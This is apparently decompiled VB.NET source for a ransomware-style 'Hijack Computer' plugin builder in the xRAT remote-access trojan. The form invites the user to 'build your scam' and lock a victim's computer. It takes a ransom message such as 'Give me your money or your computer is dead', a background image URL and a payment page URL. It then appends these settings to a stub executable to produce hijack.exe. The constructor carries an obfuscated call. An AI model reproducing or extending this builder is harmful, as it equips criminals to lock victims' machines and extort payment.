Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class hijackb
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.hijackb_Load)
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim path As String = (FileSystem.CurDir & "\data\datahijack.exe")
                If Not File.Exists(path) Then
                    Application.Exit
                Else
                    If File.Exists("hijack.exe") Then
                        File.Delete("hijack.exe")
                    End If
                    File.Copy(path, (FileSystem.CurDir & "\hijack.exe"))
                    File.AppendAllText((FileSystem.CurDir & "\hijack.exe"), String.Concat(New String() { "Dico", Me.TextBox1.Text, "Dico", Me.TextBox2.Text, "Dico", Me.TextBox3.Text, "Dico", Me.ComboBox1.Text, "Dico", Me.TextBox4.Text }))
                    MessageBox.Show("Hijack.exe is build.", "Hijack", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub hijackb_Load(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(hijackb))
            Me.TextBox1 = New TextBox
            Me.TextBox2 = New TextBox
            Me.Label1 = New Label
            Me.TextBox3 = New TextBox
            Me.Label2 = New Label
            Me.ComboBox1 = New ComboBox
            Me.Label3 = New Label
            Me.TextBox4 = New TextBox
            Me.Button1 = New Button
            Me.SuspendLayout
            Dim point As New Point(12, &H29)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            Dim size As New Size(&H117, &H15)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 0
            Me.TextBox1.Text = "---> Title of Windows Form"
            point = New Point(12, &H44)
            Me.TextBox2.Location = point
            Me.TextBox2.Multiline = True
            Me.TextBox2.Name = "TextBox2"
            size = New Size(&H117, &H47)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 1
            Me.TextBox2.Text = "Text to show in the center of the form. (ex: Give me your money or your computer is dead)"
            Me.Label1.AutoSize = True
            point = New Point(13, 13)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            size = New Size(&H116, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 2
            Me.Label1.Text = "Build your scam, and block the computer with this plugin."
            point = New Point(12, &H91)
            Me.TextBox3.Location = point
            Me.TextBox3.Name = "TextBox3"
            size = New Size(&H117, &H15)
            Me.TextBox3.Size = size
            Me.TextBox3.TabIndex = 3
            Me.TextBox3.Text = "http://www.site.com/background_picture.png"
            Me.Label2.AutoSize = True
            point = New Point(13, &HB3)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&H48, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 4
            Me.Label2.Text = "Color of text:"
            Me.ComboBox1.FormattingEnabled = True
            Me.ComboBox1.Items.AddRange(New Object() { "Black", "White" })
            point = New Point(&H52, &HB0)
            Me.ComboBox1.Location = point
            Me.ComboBox1.Name = "ComboBox1"
            size = New Size(&HD1, &H15)
            Me.ComboBox1.Size = size
            Me.ComboBox1.TabIndex = 5
            Me.ComboBox1.Text = "Black"
            Me.Label3.AutoSize = True
            point = New Point(&H12, &HCC)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(&H10D, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = 6
            Me.Label3.Text = "Url of your page of payment: (starpass,paypal ect....)"
            point = New Point(12, 220)
            Me.TextBox4.Location = point
            Me.TextBox4.Name = "TextBox4"
            size = New Size(&H117, &H15)
            Me.TextBox4.Size = size
            Me.TextBox4.TabIndex = 7
            Me.TextBox4.Text = "http://www.site.com/starpass.php"
            point = New Point(12, &HF7)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H117, &H42)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 8
            Me.Button1.Text = ":: Build Plugin ::"
            Me.Button1.UseVisualStyleBackColor = True
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H12F, &H151)
            Me.ClientSize = size
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.TextBox4)
            Me.Controls.Add(Me.Label3)
            Me.Controls.Add(Me.ComboBox1)
            Me.Controls.Add(Me.Label2)
            Me.Controls.Add(Me.TextBox3)
            Me.Controls.Add(Me.Label1)
            Me.Controls.Add(Me.TextBox2)
            Me.Controls.Add(Me.TextBox1)
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "hijackb"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "Hijack Computer"
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = value
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ComboBox1 As ComboBox
            Get
                Return Me._ComboBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ComboBox)
                Me._ComboBox1 = value
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label1 = value
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label2 = value
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            Get
                Return Me._Label3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label3 = value
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox2 = value
            End Set
        End Property

        Friend Overridable Property TextBox3 As TextBox
            Get
                Return Me._TextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox3 = value
            End Set
        End Property

        Friend Overridable Property TextBox4 As TextBox
            Get
                Return Me._TextBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox4 = value
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("ComboBox1")> _
        Private _ComboBox1 As ComboBox
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label3")> _
        Private _Label3 As Label
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        <AccessedThroughProperty("TextBox3")> _
        Private _TextBox3 As TextBox
        <AccessedThroughProperty("TextBox4")> _
        Private _TextBox4 As TextBox
        Private icontainer_0 As IContainer
    End Class
End Namespace

